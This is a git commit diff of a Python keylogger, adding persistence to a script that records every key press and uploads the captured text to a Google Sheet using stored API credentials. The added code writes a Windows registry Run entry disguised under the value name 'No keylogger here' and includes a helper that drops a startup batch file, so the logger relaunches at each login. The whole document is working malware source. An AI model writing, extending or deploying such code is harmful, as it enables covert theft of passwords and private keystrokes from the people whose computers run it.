21ba80be78ba471c48231fa31f28fa92accff840
Paul Novacovici <novacov2@illinois.edu>
2018-04-23 14:31:59 -0500

    keylogger first commit

--- keylogger.py
+++ keylogger.py
@@ -1,16 +1,46 @@
+from winreg import *
 import keyboard
 import json
 import gspread
+import sys
 from oauth2client.client import SignedJwtAssertionCredentials
+import getpass
+import os
 
 buf = []
 column = 0
 row = 1
 
+def add_to_startup():
+    if os.name == "nt":
+        add_to_registry_windows()
+    elif os.name == "mac":
+        add_to_startup_mac()
+
+def add_to_startup_mac():
+    """"""
+
+# https://stackoverflow.com/questions/4438020/how-to-start-a-python-file-while-windows-starts
+def add_to_startup_windows(file_path=""):
+    username = getpass.getuser()
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % username
+    with open(bat_path + '\\' + "keylogger.bat", "w+") as bat_file:
+        bat_file.write("python %s" % file_path)
+
+def add_to_registry_windows():
+    new_file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2change, 'No keylogger here', 0, REG_SZ,
+               new_file_path)
+
 def write_to_spread(text):
     global column
     global row
-    json_key = json.load(open('creds.json')) # json credentials you downloaded earlier
+    creds_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + "creds.json"
+    json_key = json.load(open(creds_path)) # json credentials you downloaded earlier
     scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
 
     credentials = SignedJwtAssertionCredentials(json_key['client_email'], json_key['private_key'].encode(), scope) # get email and key from creds
@@ -26,7 +56,7 @@ def write_to_spread(text):
     sheet.update_acell(cell, text)
     column += 1
 
-def foo(e):
+def tracker(e):
     global buf
     if e.name == "enter" or e.name == "tab":
         write_to_spread(''.join(buf))
@@ -40,9 +70,10 @@ def foo(e):
         buf.append(e.name)
 
 def start():
-    keyboard.on_press(foo)
+    keyboard.on_press(tracker)
     while True:
         """Run forever"""
 
 if __name__ == "__main__":
+    add_to_startup()
     start()
